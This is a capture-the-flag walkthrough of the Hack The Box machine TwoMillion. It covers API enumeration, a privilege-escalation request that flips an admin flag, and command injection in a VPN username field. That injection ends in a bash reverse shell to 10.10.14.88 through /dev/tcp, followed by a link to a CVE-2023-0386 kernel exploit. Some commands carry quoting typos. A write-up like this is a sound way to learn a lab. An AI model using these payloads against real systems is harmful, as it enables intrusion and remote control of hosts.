---
title:  HTB - TwoMillion
date: 2023-06-07 12:17:34 -0400
categories: [hackthebox , TwoMillion]
tags: [HackTheBox, API endpoints, API, CVE-2023-0386, nmap, web, rot13, curl,OverlaysFS Fuse]
image:
  path: /assets/img/post/twomillion/twomillion-card.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hack the Box - TwoMillion.
---

## Box Info

| Name                  | Bizness          | 
| :-------------------- | ---------------: |
| Release Date          | 07 Jun, 2023     |
| OS                    | Linux            |
| Rated Difficulty      | Easy             |

## Enumeration

### Nmap

```bash
nmap -p- --min-rate 5000 -n -sS -vvv -Pn 10.10.11.221 -oG allPorts
nmap -sCV -p 22,80 10.10.11.221 -oN targeted
```

![Image](/assets/img/post/twomillion/0.png)

### Resolution DNS

```bash
echo "10.10.11.221 twomillion.htb | sudo tee -a /etc/hosts"
```

![Image](/assets/img/post/twomillion/1.png)

## Web 

When hover the mouse over "`here`" show it us the link to goes.

![Image](/assets/img/post/twomillion/2.png)

Looking in dom i found this path from a API and the instruction of how script works

![Image](/assets/img/post/twomillion/3.png)

![Image](/assets/img/post/twomillion/4.png)

Url decode for read more comfort:

```js
function verifyInviteCode(code){
var formData = {"code":code};
$.ajax({
type: "POST",
url: '/api/v1/invite/verify',
dataType: 'json',
data: formData,
success: function(response){
console.log(response);
},
error: function(response){
console.log(response);
}
});
}

function makeInviteCode(){
$.ajax({
type: "POST",
url: '/api/v1/invite/how/to/generate',
dataType: 'json',
success: function(response){
console.log(response);
},
error: function(response){
console.log(response);
}
});
}
```

Theres a interesting function called makeInviteCode so we gonna execute this function on console from inspection web.

![Image](/assets/img/post/twomillion/5.png)

If i click in the object it show us something interesting encrypte in `ROT13`

![Image](/assets/img/post/twomillion/6.png)

We can decrypt rot13 with some web page for that

![Image](/assets/img/post/twomillion/7.png)

`"In order to generate the invite code, make a POST request to /api/invite/generate"`

```bash
curl -s -X POST "http://2million.htb/api/v1/invite/generate"
```

With `curl` can send a POST method for generate the invite code.

![Image](/assets/img/post/twomillion/8.png)

And the API it generate us an code in base64, it can decrypt with base64[^code] and use it for registration us web and login.

![Image](/assets/img/post/twomillion/9.png)

![Image](/assets/img/post/twomillion/10.png)

Looking in the web, I found a path in api/v1

![Image](/assets/img/post/twomillion/11.png)

## API

Abusing again the API we send a request in method GET with the Cookie

```bash
`curl -s -X GET "http://2million.htb/api/v1" -H "Cookie: PHPSESSID=avhllptt4vvs1rbocvart3ue9b"`
```

![Image](/assets/img/post/twomillion/12.png)

```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=" -H "Content-Type: application/json" | jq
```

![Image](/assets/img/post/twomillion/13.png)

```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=" -H "Content-Type: application/json" -d '{"email": "jack@jack.com"}' | jq
```

![Image](/assets/img/post/twomillion/14.png)

```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=" -H "Content-Type: application/json" -d '{"email": "jack@jack.com", "is:admin": "True"}' | jq
```

![Image](/assets/img/post/twomillion/15.png)

```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=" -H "Content-Type: application/json" -d '{"email": "jack@jack.com", "is:admin": "1"}' | jq
```

![Image](/assets/img/post/twomillion/16.png)

```bash
curl -s -X GET "http://2million.htb/api/v1/admin/auth" -H "Cookie: PHPSESSID="
```

![Image](/assets/img/post/twomillion/17.png)

```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=" -H "Content-Type: application/json' -d '{"username": "jack"}' | jq
```

![Image](/assets/img/post/twomillion/18.png)

![Image](/assets/img/post/twomillion/19.png)

```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=" -H "Content-Type: application/json' -d '{"username": ";whoami;"}'
```

![Image](/assets/img/post/twomillion/20.png)

```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=" -H "Content-Type: application/json' -d '{"username": ";ls;"}'
```

![Image](/assets/img/post/twomillion/21.png)

```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=" -H "Content-Type: application/json' -d '{"username": ";bash -c \"bash -i >& /dev/tcp/10.10.14.88/443 0>&1\" #"}'
```

![Image](/assets/img/post/twomillion/22.png)

```bash
rlwrap nc -lvnp 443
```

![Image](/assets/img/post/twomillion/23.png)

Enumerate linux we can see a folder with the name .env this contain a credentials in plane text. We are a www-data so we need

![Image](/assets/img/post/twomillion/24.png)

admin SuperDuperPass123

When we login the first appear is mail, this mail is lcoated in /var/mail

![Image](/assets/img/post/twomillion/25.png)

## CVE-2023-0386

Well, the mail says everything... Google it.

![Image](/assets/img/post/twomillion/26.png)

Search in google "OverlaysFS Fuse linux kernel and the fisrt poc i found is this `CVE-2023-0386`[^cve]

![Image](/assets/img/post/twomillion/27.png)

ROOT

### Source

[^code]: <https://www.base64decode.org/>
[^cve]: <https://github.com/sxlmnwb/CVE-2023-0386>